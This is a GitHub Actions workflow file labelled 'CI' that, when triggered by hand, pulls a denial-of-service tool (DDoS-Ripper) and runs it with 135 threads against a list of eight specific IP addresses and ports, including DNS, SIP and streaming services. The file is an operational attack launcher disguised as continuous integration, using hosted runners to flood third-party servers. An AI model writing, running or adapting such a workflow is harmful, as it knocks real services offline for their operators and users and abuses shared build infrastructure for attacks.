name: CI

on:
  workflow_dispatch:

jobs:
  run:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        site: ['213.24.76.25:1935', '213.24.76.25:8080', '195.218.193.189:5060', '95.173.148.51:5060', '95.173.148.51:554', '95.173.148.51:53', '95.173.148.50:53', '109.252.233.150:51']
    container:
      image: alpine/bombardier

    steps:
      - uses: actions/checkout@v2
        with:
          repository: palahsu/DDoS-Ripper

      - name: Run a multi-line script
        run: |
          site=${{ matrix.site }}
          arr=(${site//:/ })
          python3 DRipper.py -s ${arr[0]} -p ${arr[1]} -t 135 -q
